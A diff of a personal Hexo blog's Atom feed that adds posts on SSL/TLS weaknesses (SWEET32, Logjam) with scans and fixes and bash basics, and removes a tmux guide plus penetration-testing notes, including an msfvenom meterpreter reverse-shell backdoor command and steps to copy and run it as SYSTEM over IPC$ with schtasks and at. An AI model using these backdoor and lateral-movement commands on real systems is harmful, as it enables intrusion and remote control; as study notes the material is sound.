@@ -6,7 +6,7 @@
   <link href="https://askding.github.io/atom.xml" rel="self"/>
   
   <link href="https://askding.github.io/"/>
-  <updated>2020-12-22T01:26:14.000Z</updated>
+  <updated>2020-12-28T07:50:03.000Z</updated>
   <id>https://askding.github.io/</id>
   
   <author>
@@ -15,6 +15,86 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sleep</title>
+    <link href="https://askding.github.io/Evolution/sleep.html"/>
+    <id>https://askding.github.io/Evolution/sleep.html</id>
+    <published>2020-12-28T07:50:03.000Z</published>
+    <updated>2020-12-28T07:50:03.000Z</updated>
+    
+    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">U2FsdGVkX1/Ay/VPbWu8xyNc3fvvFbvgbhv6hcV80szzpE6lHXl4Kkr7Cwz016MA+3zpWA2OdBaoOSDCwcx37sNdyJlQ02IICoxOMjbM14R9Ve7N2apyBmC7anbnu1EX7hogrIR+Vu5OtiKhphCVBG5aJGlZq9ARTFmBCndiKn2oSEPorIlM9UL/JM+QEfI/cXr0lga3Wit6bCV7h0Dt8IvulHDD9C0PQ3zWcPxqFqOQjYiEmJGD+lklvrU4GlsZLJ4MUxKXhCkAWZ6qBTRjSn9ONYkm8/0O9fd/2SkIa0Dguf098z7iT/aWGxDkC/elGXHu84Xx7pD1hWbB61+pDPaP7/+NZedBGF3JIGChR6liIfT8aqNwGgR9CGnliyXqc2w7yE3JtMeOs6/Jo66P9q6Q+U1WiIUhuxRJH1W9yeP8bHMv3Y58KHIBMU098U4lNVIANoTdnNHayWuV3AqbHHlAZADjjxDl2njZERFujV50LzG7Y6cgNGsYLmDWIf79CiB2j62yMIhosEbfS7nvGVNMlCb62r6NTXTiibVXLRR+NQSYjrAvRQJo/egbZM7I8dddb44OP1hfnbP++RoHmLGlM+o5JZFJF9AsL7YpFeJJy24WIK4A3myM4mUO+s2U22dNUdOaAFRp+cjOEVOwg6gG/AzbGmHBZKjnKtOZ8Yvswa54x2ZhBTGmLuWCSjYWO2enp/K9rQvgT4hg6/UFq7wAguvTSXcRi0NCoGDU7lH3bVVNa/DmcGb9nW42qejDHPfnePz4jjF/Pck57uE2hi10IBMkunTchNcAnNVpIzMFC3GsNRi1I0Lxc4D26Jkm76Rw1DO4oQKZufArmoc7bYicVPWi0yNyTNrro8AICIGGeqGlJNsjJUM9dL66mnVkaYGfsa4vrq526w2wEebbwOeZWSVITla8OWsSVGoh2q5Dyj6HrDqIbesFkTvCLV/2iAetp9G4MDRtsK6FIzjzOkmomoEJRD1VC+iTq+aZgIwJk+fugnUyR7gQE8ggEHkZ8yzIPnUR/dL3J3YQY+tAcE5hcD7w2VkQrissEq0ozjLvnIywgwWi99EhCstIBROytd3enNUJYh36huOfGZeSWgGAnZYpJIaYXgS2fIcT6l7gd0tObuQfiFsa1xXtwsgfptTPtavxowPc2Ouq1ecF9QV5wrFtX9zMzpCyjXFfoU2D+ujNeldjhw+uAcunaQVBY0T1MolDald5SNy87E5X2+EiNbObnaWO0zHs+CedUTulYjX9A2O5fUdURg8eocSZE1p935HtPQDDshlbScsls4B+yULHgDsx87rsNI1Bb6wrUimVADolqCnldZjaSpyXh8geKSiXZ3Gsi/SI85ts6KGXoE3mw1t92Gls+KCjsA7AFJqisyz7IVON8Kl60BthuU6NewZnj+VlWaizviQWLV7hNhxm4ubE/0Cfu4n/24w833BRwa0jm+1r3FaZcbaalMV5EoRS3x+YKzelqzyjDvICou7rYBOVPaskuzDY+hBqqnVC7LTejX4LfUXRr88ZA6uhnQTyEZxSju8f0hITa/pGZiP9huOhLWIQ63t1kErccPmcsvwStyindD12iWd9eu9D6qNRUZHk5GhZ/4tis5ESBZMO63w1ZjatTHpGS/buXlQ5vVgT7iA3/fgDtM5h</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
+&lt;script&gt;
+function doDecrypt (pwd, onError) {
+	console.log(&#39;in doDecrypt&#39;);
+	const txt = document.getE</summary>
+      
+    
+    
+    
+    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>SSLTLS相关漏洞</title>
+    <link href="https://askding.github.io/Kali/Exploit/SSLTLS%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html"/>
+    <id>https://askding.github.io/Kali/Exploit/SSLTLS%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html</id>
+    <published>2020-12-25T02:41:48.000Z</published>
+    <updated>2020-12-25T02:41:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="SWEET32攻击-CVE-201602183"><a href="#SWEET32攻击-CVE-201602183" class="headerlink" title="SWEET32攻击 CVE-201602183"></a>SWEET32攻击 CVE-201602183</h2><p>使用64位块大小如3DES的传统分组密码当以CBC（密码分组链接）模式使用时易遭受碰撞攻击。当使用CBC模式时，简单的生日攻击就能识别出64位分组密码碰撞。当碰撞发生时意味着输入和输出是一样的，这样就可能发动BEAST方式的攻击提取加密数据。</p><pre><code class="zsh">./testssl.sh -W https://10.199.27.2 Testing for SWEET32 (Birthday Attacks on 64-bit Block Ciphers) SWEET32 (CVE-2016-2183, CVE-2016-6329)    VULNERABLE,uses 64 bit block ciphersnmap -sV --script ssl-enum-ciphers -p 443 10.199.27.1</code></pre><h3 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h3><p>参考链接：<br><a href="https://segmentfault.com/a/1190000038486902">CVE-2016-2183</a></p><ul><li>HTTPD<blockquote><p>/etc/httpd/conf.d/ssl.conf</p></blockquote><pre><code class="zsh">SSLCipherSuite HIGH:!aNULL:!MD5:!3DES;</code></pre></li><li>Nginx<blockquote><p>/usr/local/etc/nginx/nginx.conf</p></blockquote><pre><code class="zsh">ssl_ciphers HIGH:!aNULL:!MD5:!3DES;</code></pre></li></ul><h2 id="Logjam攻击-CVE-2015-4000"><a href="#Logjam攻击-CVE-2015-4000" class="headerlink" title="Logjam攻击 CVE-2015-4000"></a>Logjam攻击 CVE-2015-4000</h2><p>Logjam漏洞可帮助攻击者(中间人)将TLS连接降级为512位导出级加密。这有助于攻击者读取和修改通过网络连接传输的任何数据。</p><pre><code class="zsh">./testssl -J https://10.199.27.1Testing for LOGJAM vulnerability LOGJAM (CVE-2015-4000), experimental      VULNERABLE (NOT ok): common prime: RFC2409/Oakley Group 2 (1024 bits),                                           but no DH EXPORT ciphers</code></pre><h3 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h3><blockquote><p>/etc/httpd/conf.d/ssl.conf</p></blockquote><ul><li>HTTPD<pre><code class="zsh">SSLCipherSuite !EXPORT</code></pre></li></ul><blockquote><p>/usr/local/etc/nginx/nginx.conf</p></blockquote><ul><li>Nginx<pre><code class="zsh">ssl_ciphers &#39;!EXPORT&#39;; #Note: - If you already have ssl_ciphers configured, you just need to add !EXPORT in existing line instead of adding new one.</code></pre></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;SWEET32攻击-CVE-201602183&quot;&gt;&lt;a href=&quot;#SWEET32攻击-CVE-201</summary>
+      
+    
+    
+    
+    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
+    
+    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>bash_basic</title>
+    <link href="https://askding.github.io/Coding/bash-basic.html"/>
+    <id>https://askding.github.io/Coding/bash-basic.html</id>
+    <published>2020-12-24T10:00:59.000Z</published>
+    <updated>2020-12-24T10:00:59.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="编程基本元素"><a href="#编程基本元素" class="headerlink" title="编程基本元素"></a>编程基本元素</h1><h2 id="I-O"><a href="#I-O" class="headerlink" title="I/O"></a>I/O</h2><pre><code class="zsh">VAR=&quot;string&quot; # 声明变量之间不能带有空格read MYVAR  # inputCMDOUT=$(pwd)  # 将pwd命令的输出保存到CMDOUT中echo &quot;$MYVAR&quot;  # outputprintf &quot;$VAR&quot;  # output</code></pre><ul><li>‘aa $bb aa’ : $bb原样输出,不会被转义</li><li>“aa $bb aa” : $bb会被替换，转义后输出</li></ul><h2 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h2><p>每个参数由空格符分隔，并在bash中使用一组特殊的标识符$[num]进行访问。</p><ul><li><p>$0 : 表示存放脚本的名称</p></li><li><p>$1 : 第一个参数</p></li><li><p>$2 : 第二个参数</p></li><li><p>$n : 第n个参数</p></li><li><p>$# : 参数的数量,不包括$0</p></li><li><p>$? : 代表上一个运行的状态</p><ul><li>0 : 表示上一条命令执行成功</li><li>非0: 表示上一条命令执行失败</li></ul></li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre><code class="zsh">function myfun()&#123;# body of the funtion goes here&#125;</code></pre><p>⚠️</p><ul><li>作用域: 函数内的变量的作用域默认是全局的，可使用<code>local</code>限定作用域于函数内</li><li>函数定义中不必声明参数个数，参数个数由此函数被调用时给定。</li></ul><h1 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h1><h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><pre><code class="zsh">if  cmd   # 比较操作时可使用复合命令[[]],或内建[],或test命令 then  some cmdselse  other cmdsfi</code></pre><p>复合命令中[[]]、(())的区别</p><ul><li>[[]] : 算数表达式 比较的是词法(字面量、字母顺序)的逻辑</li><li>(()) : 比较的是数值化的逻辑</li></ul><p>文件操作测试符</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">-d</td><td align="center">测试目录是否存在</td></tr><tr><td align="center">-e</td><td align="center">测试文件是否存在</td></tr><tr><td align="center">-r</td><td align="center">测试文件是否存在且可读</td></tr><tr><td align="center">-w</td><td align="center">测试文件是否存在且可写</td></tr><tr><td align="center">-x</td><td align="center">测试文件是否存在且可执行</td></tr><tr><td align="center">数值操作符</td><td align="center"></td></tr><tr><td align="center">-eq</td><td align="center">检测数之前是否相等</td></tr><tr><td align="center">-gt</td><td align="center">测试一个数字是大于另一个</td></tr><tr><td align="center">-lt</td><td align="center">测试一个数字是否小于另一个</td></tr></tbody></table><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="While"><a href="#While" class="headerlink" title="While"></a>While</h3><pre><code class="zsh">i=0while ((i&lt; 1000))do    echo $i  let i++done</code></pre><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><pre><code class="zsh">for ((i=0;i&lt;100;i++))do  echo $idone</code></pre><pre><code class="zsh">for i in 2; do  cmds  done</code></pre><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><pre><code class="zsh">ssh myserver ps &gt; /tmp/ps.out  #重定向到本地/tmp目录ssh myserver ps \&gt; /tmp/ps.out #重定向到服务器/tmp目录 </code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&quot;编程基本元素&quot;&gt;&lt;a href=&quot;#编程基本元素&quot; class=&quot;headerlink&quot; title=&quot;</summary>
+      
+    
+    
+    
+    <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Learning_in_workplace_with_high_efficiency</title>
@@ -473,79 +553,6 @@
     <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
     
     <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Tmux</title>
-    <link href="https://askding.github.io/Tools/Tmux.html"/>
-    <id>https://askding.github.io/Tools/Tmux.html</id>
-    <published>2020-12-07T10:14:43.000Z</published>
-    <updated>2020-12-07T10:14:43.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="../images/tmux-1.gif" alt="tmux-1"></p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre><code>$ cd$ git clone https://github.com/gpakosz/.tmux.git$ ln -s -f .tmux/.tmux.conf$ cp .tmux/.tmux.conf.local .</code></pre><h2 id="Key-Bindings"><a href="#Key-Bindings" class="headerlink" title="Key-Bindings"></a>Key-Bindings</h2><ul><li><code>&lt;prefix&gt;</code> <kbd>Ctrl</kbd> + <kbd>a</kbd> or <kbd>Ctrl</kbd> + <kbd>b</kbd></li><li><code>&lt;prefix&gt; c</code>  <kbd>Ctrl</kbd> + <kbd>a</kbd> + <kbd>c</kbd></li><li><code>&lt;prefix&gt; C-c</code>  <kbd>Ctrl</kbd> + <kbd>a</kbd>  + <kbd>Ctrl</kbd> + <kbd>c</kbd></li><li><code>&lt;prefix&gt; ?</code> manual </li><li><code>&lt;prefix&gt; d</code> detached the current session</li><li><code>&lt;ctrl&gt; +d</code> kill current session</li><li><code>&lt;prefix&gt; d</code> close current panel</li></ul><p>This configuration uses the following bindings:</p><ul><li><code>&lt;prefix&gt; e</code> opens <code>~/.tmux.conf.local</code></li><li><code>&lt;prefix&gt; r</code> reloads <code>~/.tmux.conf.local</code></li><li><code>C-l</code> clears both the screen and the tmux history</li></ul><h3 id="Session-Operation"><a href="#Session-Operation" class="headerlink" title="Session Operation:"></a>Session Operation:</h3><ul><li><code>&lt;prefix&gt; C-c</code> creates a new session</li><li><code>&lt;prefix&gt; C-f</code> lets you switch to another session by name</li><li><code>&lt;prefix&gt; $</code> rename session name</li><li><code>&lt;prefix&gt; s</code> list sessions</li></ul><h3 id="Windows-Operation"><a href="#Windows-Operation" class="headerlink" title="Windows Operation:"></a>Windows Operation:</h3><ul><li><code>&lt;prefix&gt; C-h</code> and <code>&lt;prefix&gt; C-l</code> let you navigate windows </li><li><code>&lt;prefix&gt; c</code> create window</li><li><code>&lt;prefix&gt; w</code> list windows </li><li><code>&lt;prefix&gt; Tab</code> brings you to the last active window</li><li><code>&lt;prefix&gt; 1,2,3</code> let you navigate to specific window</li><li><code>&lt;prefix&gt; ,</code> rename current window</li><li><code>&lt;prefix&gt; &amp;</code> close current window</li><li><code>&lt;prefix&gt; f</code> find specific window by name</li></ul><h3 id="Panel-Operation"><a href="#Panel-Operation" class="headerlink" title="Panel Operation:"></a>Panel Operation:</h3><ul><li><p><code>&lt;prefix&gt; /</code> splits the current pane vertically</p></li><li><p><code>&lt;prefix&gt; -</code> splits the current pane horizontally</p></li><li><p><code>&lt;prefix&gt; h</code>, <code>&lt;prefix&gt; j</code>, <code>&lt;prefix&gt; k</code> and <code>&lt;prefix&gt; l</code> let you navigate</p></li><li><p><code>&lt;prefix&gt; o</code> navigate panels</p></li><li><p><code>&lt;prefix&gt; H</code>, <code>&lt;prefix&gt; J</code>, <code>&lt;prefix&gt; K</code>, <code>&lt;prefix&gt; L</code> let you resize panes</p></li><li><p><code>&lt;prefix&gt; &lt;</code> and <code>&lt;prefix&gt; &gt;</code> let you swap panes</p></li><li><p><code>&lt;prefix&gt; +</code> maximizes the current pane to a new panel</p></li><li><p><code>&lt;prefix&gt; x</code> kill the current panel</p></li><li><p><code>&lt;prefix&gt; m</code> toggles mouse mode on or off</p></li><li><p><code>&lt;prefix&gt; &lt;space&gt; </code> 切换窗格布局</p></li><li><p><code>&lt;prefix&gt; Enter</code> enters copy-mode</p></li><li><p><code>&lt;prefix&gt; b</code> lists the paste-buffers</p></li><li><p><code>&lt;prefix&gt; p</code> pastes from the top paste-buffer</p></li><li><p><code>&lt;prefix&gt; P</code> lets you choose the paste-buffer to paste from</p></li></ul><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><hr><p>file: <code>~/.tmux.conf.local</code><br>variables:</p><pre><code>tmux_conf_theme_left_separator_main=&#39;\uE0B0&#39;tmux_conf_theme_left_separator_sub=&#39;\uE0B1&#39;tmux_conf_theme_right_separator_main=&#39;\uE0B2&#39;tmux_conf_theme_right_separator_sub=&#39;\uE0B3&#39;</code></pre><h3 id="Configuring-the-status-line"><a href="#Configuring-the-status-line" class="headerlink" title="Configuring the status line"></a>Configuring the status line</h3><p>Edit the <code>~/.tmux.conf.local</code> file (<code>&lt;prefix&gt; e</code>) and adjust the<br><code>tmux_conf_theme_status_left</code> and <code>tmux_conf_theme_status_right</code> variables to<br>your own preferences.</p><p>This configuration supports the following builtin variables:</p><ul><li><code>#&#123;battery_bar&#125;</code>: horizontal battery charge bar</li><li><code>#&#123;battery_percentage&#125;</code>: battery percentage</li><li><code>#&#123;battery_status&#125;</code>: is battery charging or discharging?</li><li><code>#&#123;battery_vbar&#125;</code>: vertical battery charge bar</li><li><code>#&#123;circled_session_name&#125;</code>: circled session number, up to 20</li><li><code>#&#123;hostname&#125;</code>: SSH/Mosh aware hostname information</li><li><code>#&#123;hostname_ssh&#125;</code>: SSH/Mosh aware hostname information, blank when not<br>connected to a remote server through SSH/Mosh</li><li><code>#&#123;loadavg&#125;</code>: load average</li><li><code>#&#123;pairing&#125;</code>: is session attached to more than one client?</li><li><code>#&#123;prefix&#125;</code>: is prefix being depressed?</li><li><code>#&#123;root&#125;</code>: is current user root?</li><li><code>#&#123;synchronized&#125;</code>: are the panes synchronized?</li><li><code>#&#123;uptime_y&#125;</code>: uptime years</li><li><code>#&#123;uptime_d&#125;</code>: uptime days, modulo 365 when <code>#&#123;uptime_y&#125;</code> is used</li><li><code>#&#123;uptime_h&#125;</code>: uptime hours</li><li><code>#&#123;uptime_m&#125;</code>: uptime minutes</li><li><code>#&#123;uptime_s&#125;</code>: uptime seconds</li><li><code>#&#123;username&#125;</code>: SSH/Mosh aware username information</li><li><code>#&#123;username_ssh&#125;</code>: SSH aware username information, blank when not connected<br>to a remote server through SSH/Mosh</li></ul><p>Beside custom variables mentioned above, the <code>tmux_conf_theme_status_left</code> and<br><code>tmux_conf_theme_status_right</code> variables support usual tmux syntax, e.g. using<br><code>#()</code> to call an external command that inserts weather information provided by<br><a href="https://github.com/chubin/wttr.in#one-line-output">wttr.in</a>:</p><pre><code>tmux_conf_theme_status_right=&#39;#&#123;prefix&#125;#&#123;pairing&#125;#&#123;synchronized&#125; #(curl wttr.in?format=3) , %R , %d %b | #&#123;username&#125;#&#123;root&#125; | #&#123;hostname&#125; &#39;</code></pre><p><img src="../images/tmux-2.png" alt="tmux-2"></p><h3 id="Accessing-the-macOS-clipboard-from-within-tmux-sessions"><a href="#Accessing-the-macOS-clipboard-from-within-tmux-sessions" class="headerlink" title="Accessing the macOS clipboard from within tmux sessions"></a>Accessing the macOS clipboard from within tmux sessions</h3><p>[Chris Johnsen created the <code>reattach-to-user-namespace</code><br>utility][reattach-to-user-namespace] that makes <code>pbcopy</code> and <code>pbpaste</code> work<br>again within tmux.</p><p>To install <code>reattach-to-user-namespace</code>, use either <a href="http://www.macports.org/">MacPorts</a> or<br><a href="http://brew.sh/">Homebrew</a>:</p><p>   <code> $ port install tmux-pasteboard</code></p><p>or</p><pre><code>`$ brew install reattach-to-user-namespace`</code></pre><p>Once installed, <code>reattach-to-usernamespace</code> will be automatically detected.</p><p><a href="https://www.cnblogs.com/kevingrace/p/6496899.html">tmux终端复用神器</a><br><a href="https://gist.github.com/ryerh/14b7c24dfd623ef8edc7">Tmux 快捷键</a><br><a href="https://segmentfault.com/a/1190000016283278">多窗口管理器Tmux - 从入门到精通</a><br><a href="https://harttle.land/2015/11/06/tmux-startup.html">优雅地使用命令行：Tmux 终端复用 </a><br>[<a href="https://segmentfault.com/a/1190000000423141">结对编程利器：SSH和Tmux</a>]</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;../images/tmux-1.gif&quot; alt=&quot;tmux-1&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;Installation&quot;&gt;&lt;a href=&quot;#Installation&quot; class=&quot;headerlink&quot; title=&quot;Installation&quot;&gt;&lt;</summary>
-      
-    
-    
-    
-    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>IPC Basic Operation</title>
-    <link href="https://askding.github.io/Kali/PostExploit/IPC-Basic-Operation.html"/>
-    <id>https://askding.github.io/Kali/PostExploit/IPC-Basic-Operation.html</id>
-    <published>2020-12-07T09:55:00.000Z</published>
-    <updated>2020-12-07T09:55:00.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="IPC-Internet-Process-Connection-是共享”命名管道”的资源。"><a href="#IPC-Internet-Process-Connection-是共享”命名管道”的资源。" class="headerlink" title="IPC$(Internet Process Connection)是共享”命名管道”的资源。"></a>IPC$(Internet Process Connection)是共享”命名管道”的资源。</h2><p>它是为了让进程间通信而开放的命名管道，<br>通过提供可信任的用户名和口令，<br>连接双方可以建立安全的通道并以此通道进行加密数据的交换，<br>从而实现对远程计算机的访问。</p><p>使用条件：</p><ul><li>开放了139、445端口；</li><li>目标开启ipc$文件共享；</li><li>获取用户账号密码。</li></ul><h3 id="msfvenom生成后门"><a href="#msfvenom生成后门" class="headerlink" title="msfvenom生成后门"></a>msfvenom生成后门</h3><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.79.207 LPORT=4444 -f exe &gt; ./test.exe</code></pre><h3 id="与目标建立ipc-连接"><a href="#与目标建立ipc-连接" class="headerlink" title="与目标建立ipc$连接"></a>与目标建立ipc$连接</h3><pre><code class="zsh">#建立ipc连接net use \\10.211.55.9\ipc$ /u:adminstrator &lt;password&gt;#查看已建立的连接net use#挂载目标c盘到本地，盘符为znet use z:  \\10.211.55.9\c$   #查看目标网路共享的资源net view \\10.211.55.9</code></pre><h3 id="拷贝test-exe到目标网络"><a href="#拷贝test-exe到目标网络" class="headerlink" title="拷贝test.exe到目标网络"></a>拷贝test.exe到目标网络</h3><pre><code>#拷贝本地文件到目标C:\windows\temp\中copy test.exe \\10.211.55.9\c$\windows\temp\#下载目录C:\windows\temp\hash.txt文件到本地copy \\10.211.55.9\c$\windows\temp\aaa.txt</code></pre><h3 id="4-启用计划任务执行"><a href="#4-启用计划任务执行" class="headerlink" title="4.启用计划任务执行"></a>4.启用计划任务执行</h3><h5 id="使用schtasks-exe命令"><a href="#使用schtasks-exe命令" class="headerlink" title="使用schtasks.exe命令"></a>使用schtasks.exe命令</h5><pre><code>#在目标上创建计划任务task_name1schtasks /create /tn task_name1 /s 10.211.55.9  /u administrator /p &lt;password&gt; /tr c:\windows\temp\test.exe /sc onstart /ru system#执行目标上的计划任务task_name1schtasks /run /s 10.211.55.9 /u administrator /p &lt;password&gt; /tn task_name1# 创建该时间之后的某个时刻自动执行任务，任务名 plugin_updateschtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p &quot;1qaz@WSX&quot;#删除目标上的计划任务task_name1schtasks /delete /s 10.211.55.9 /u administrator /p &lt;password&gt;  /tn task_name1  /f</code></pre><h5 id="使用at命令"><a href="#使用at命令" class="headerlink" title="使用at命令"></a>使用at命令</h5><pre><code>#查看目标上的时间net time \\10.211.55.9#设定目标上的定时执行的任务at \\10.211.55.9 13:54 c:\windows\temptest.exe#删除目标上的定时任务at \\10.211.55.9at \\10.211.55.9 &lt;id&gt; /del</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;IPC-Internet-Process-Connection-是共享”命名管道”的资源。&quot;&gt;&lt;a href=&quot;#IPC-Internet-Process-Connection-是共享”命名管道”的资源。&quot; class=&quot;headerlink&quot; title=&quot;IP</summary>
-      
-    
-    
-    
-    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
-    
-    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ActiveMQ</title>
-    <link href="https://askding.github.io/Kali/Exploit/ActiveMQ.html"/>
-    <id>https://askding.github.io/Kali/Exploit/ActiveMQ.html</id>
-    <published>2020-12-07T09:26:21.000Z</published>
-    <updated>2020-12-08T10:26:20.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>[toc]</p><p>ActiveMQ是Apache使用纯Java语言编写的开源消息中间件,</p><p><a href="https://juejin.cn/post/6844903920209231886">https://juejin.cn/post/6844903920209231886</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>╭─ethan@ethan.local ~╰─➤  nmap  10.184.67.63 -sV -Pn -T4  -p 61616Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-04 17:00 CSTNmap scan report for 10.184.67.63Host is up (0.047s latency).PORT      STATE SERVICE  VERSION61616/tcp open  apachemq ActiveMQ OpenWire transport 5.14.0 (Java 1.8.0_172; arch: amd64)Service Info: OS: Linux 3.10.0; CPE: cpe:/o:linux:linux_kernel:3.10.0Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds</code></pre><h2 id="Apache-ActiveMQ-Information-Leak-CVE-2017-15709"><a href="#Apache-ActiveMQ-Information-Leak-CVE-2017-15709" class="headerlink" title="Apache ActiveMQ Information Leak-[CVE-2017-15709]"></a>Apache ActiveMQ Information Leak-[CVE-2017-15709]</h2><p>Apache 